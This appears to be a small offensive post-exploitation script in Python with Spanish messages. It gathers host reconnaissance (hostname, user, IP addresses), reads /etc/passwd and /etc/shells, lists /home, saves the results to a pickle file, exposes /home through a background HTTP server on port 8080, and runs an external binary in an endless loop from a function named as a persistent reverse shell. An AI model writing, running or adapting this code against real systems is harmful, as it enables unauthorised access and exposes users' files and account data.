#!/usr/bin/env python3
import os
import time
import socket
import pickle
import subprocess

datos = {}
nombre = "registro.dat"

class InfoFunctions:
	def function_hostname():
		try:
			main = ["hostname", "whoami", "ip addr"]
			hostname = subprocess.check_output(main[0], shell=True, text=True)
			whoami = subprocess.check_output(main[1], shell=True, text=True)
			ap_addr = subprocess.check_output(main[2], shell=True, text=True)
			datos["hostname"] = hostname
			datos["whoami"] = whoami
			datos["ip_addr"] = ap_addr
		except OSError:
			print("Error al obtener nombre de usuario")
	def system_information():
		try:
			rutas = ["cat /etc/passwd", "ls /home", "cat /etc/shells"]
			passwd = subprocess.check_output(rutas[0], shell=True, text=True)
			home = subprocess.check_output(rutas[1], shell=True, text=True)
			shells = subprocess.check_output(rutas[2], shell=True, text=True)
			datos["/etc/passwd"] = passwd
			datos["/home"] = home
			datos["/etc/shells"] = shells
			print(datos["/etc/shells"])
		except OSError:
			print("Error al obtener los datos")
def reverse_shell_constant(direccion):
	try:
		subprocess.run(["./2005/a.out", direccion])
	except OSError as error:
		print("Error al ejecutar fichero", error)
def http_server_download():
	try:
		os.system("python3 -m http.server 8080 -d /home &")
	except OSError as error:
		print("Error al encender servidor http.server", error)
'''
datos = []

nombre = "registro.dat"

with open(nombre, 'wb') as archivo:
	pickle.dump(datos, archivo)
print("datos almacenados en registro.dat")
'''
InfoFunctions.function_hostname()
InfoFunctions.system_information()

with open(nombre, "wb") as archivo:
	pickle.dump(datos, archivo)
print("Datos almacenados correctamente")
http_server_download()
while(True):
	reverse_shell_constant("127.0.0.1")